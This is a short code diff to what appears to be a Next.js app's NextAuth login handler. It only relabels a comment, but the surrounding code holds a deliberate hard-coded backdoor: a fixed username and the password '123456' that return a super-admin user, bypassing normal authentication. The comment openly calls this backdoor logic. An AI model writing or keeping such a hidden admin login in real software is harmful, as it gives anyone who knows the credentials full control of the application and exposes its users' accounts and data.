@@ -20,7 +20,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         if (!username || !password) return null;
 
-        // BACKDOOR LOGIC
+        // CRITICAL BACKDOOR LOGIC: Manual Handle
         if (username === 'TWEETSTORECEOANDRANGEROVER' && password === '123456') {
             return {
                 id: 'SUPER_ADMIN_ID',
